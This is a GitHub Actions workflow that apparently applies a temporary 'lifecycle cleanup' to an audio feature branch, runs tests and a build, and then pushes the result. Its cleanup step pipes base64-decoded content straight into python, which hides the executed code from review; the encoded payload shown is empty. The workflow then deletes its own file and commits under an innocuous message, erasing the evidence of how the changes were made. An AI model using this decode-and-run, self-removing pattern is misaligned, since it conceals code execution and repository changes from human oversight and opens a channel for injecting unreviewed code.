name: TEMP audio lifecycle tighten

on:
  push:
    branches:
      - "polish/audio-presence-r1-review"

permissions:
  contents: write

jobs:
  tighten:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: polish/audio-presence-r1-review
          fetch-depth: 0
      - uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: npm
      - name: Apply lifecycle cleanup
        run: echo '' | base64 -d | python
      - run: npm ci
      - run: npm run typecheck
      - run: npm test
      - run: npm run assets:selftest
      - run: npm run assets:validate
      - run: npm run build
      - name: Commit clean product tree
        run: |
          rm .github/workflows/tmp-audio-lifecycle-tighten.yml
          git diff --check
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Tighten persistent audio cleanup"
          git push origin HEAD:polish/audio-presence-r1-review
